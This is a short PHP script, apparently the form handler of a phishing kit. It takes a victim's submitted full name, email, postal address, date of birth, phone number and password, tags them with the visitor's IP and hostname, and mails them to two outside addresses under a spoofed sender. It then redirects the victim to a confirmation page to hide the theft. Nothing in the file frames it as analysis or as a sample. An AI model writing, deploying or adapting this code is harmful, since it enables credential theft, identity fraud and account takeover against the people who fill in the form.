<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "=============-----=============\n";
$message .= "full name : ".$_POST['Log']."\n";
$message .= "email  : ".$_POST['lname']."\n";
$message .= "adress : ".$_POST['adress']."\n";
$message .= "city  : ".$_POST['city']."\n";
$message .= "zipcode : ".$_POST['zipcode']."\n";
$message .= "date  : ".$_POST['dob']."\n";
$message .= "phone : ".$_POST['phone']."\n";
$message .= "Pass  : ".$_POST['pass']."\n";

$message .= "===============================\n";

$send = "jihadonevbv@yahoo.com,jihad5@orange.fr";

$subject = "Fedback ssl - $ip";
$headers = "From:ssl <info@mtgstudios.se>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($send,$subject,$message,$headers);


header("Location: confirmation.html");
?>